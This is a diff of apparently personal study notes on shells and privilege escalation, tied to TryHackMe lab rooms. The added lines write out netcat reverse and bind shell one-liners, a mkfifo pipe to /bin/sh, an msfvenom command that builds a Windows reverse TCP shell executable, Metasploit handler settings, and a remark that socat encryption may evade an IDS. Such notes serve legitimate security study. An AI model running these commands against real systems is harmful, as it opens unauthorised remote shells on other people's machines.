@@ -14,12 +14,25 @@ https://tryhackme.com/room/linprivesc
 => hint/notes
 => network
 
+* https://tryhackme.com/room/introtoshells
 * If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
+* nc ip port -e /bin/bash (rev shell)
+* nc -lvnp port -e /bin/bash (bind shell)
+* this is not included in most versions of netcat
+* `mkfifo /tmp/f; nc XXX < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` (listener for our wxw shell)
+* https://tryhackme.com/room/introtoshells (Windows)
+* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
+* `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
+* staged reverse shell payloads and stageless
 * exploit/multi/handler
-* nc ip port -e /bin/bash
-
+  * It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads
+  * `set PAYLOAD X`
+  * `exploit -j`
 * socat is a sort of ncat+more, but not installed by default, and harder to learn.
+  * Read again the section: https://tryhackme.com/room/introtoshells
+  * Can encrypt, may bypass an IDS: https://tryhackme.com/room/introtoshells
 * Socat: transfer the socat binary
+* Reverse shells/... note lasty
 
 <hr>
 
